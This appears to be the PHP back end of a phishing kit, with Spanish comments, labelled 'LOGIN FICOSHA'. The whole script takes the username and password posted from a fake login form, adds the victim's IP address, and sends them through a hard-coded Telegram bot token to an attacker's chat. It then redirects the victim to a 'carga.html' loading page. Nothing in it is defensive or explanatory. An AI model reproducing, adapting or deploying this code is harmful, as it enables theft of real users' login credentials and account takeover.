<?php
// Datos de configuración
$telegramBotToken = '7632972589:AAFRzRlHYr8nWKXTYj4w7TqLS4VLwV_XXns';
$chatId = '-1002365815581';

// Obtener los datos del formulario
$us = $_POST['us'];
$ps = $_POST['ps'];

// Obtener la IP y la ciudad del cliente
$ip = $_SERVER['REMOTE_ADDR'];
$city = getCityFromIP($ip); // Función para obtener la ciudad según la IP

// Mensaje a enviar a Telegram
$message = "LOGIN FICOSHA:\n\n";
$message .= "US3R: " . $us . "\n";
$message .= "P4SS: " . $ps . "\n";
$message .= "IP: " . $ip . "\n";
$message .= "Ciudad: " . $city;

// Enviar el mensaje a través del bot de Telegram
$telegramApiUrl = "https://api.telegram.org/bot" . $telegramBotToken . "/sendMessage";
$telegramParams = [
  'chat_id' => $chatId,
  'text' => $message
];

// Realizar la solicitud HTTP a la API de Telegram
$ch = curl_init($telegramApiUrl);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $telegramParams);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($ch);
curl_close($ch);

// Comprobar la respuesta de la API de Telegram
if ($response === false) {
  echo "Error al enviar el mensaje a Telegram.";
}  

// Función para obtener la ciudad según la IP utilizando una API externa
function getCityFromIP($ip) {
  // Aquí debes reemplazar con tu propia implementación para obtener la ciudad según la IP
  // Utiliza una API externa o una base de datos local para obtener esta información
  return "City";
}

// Redirigir a otra página al final del código PHP
header('Location: carga.html');
?>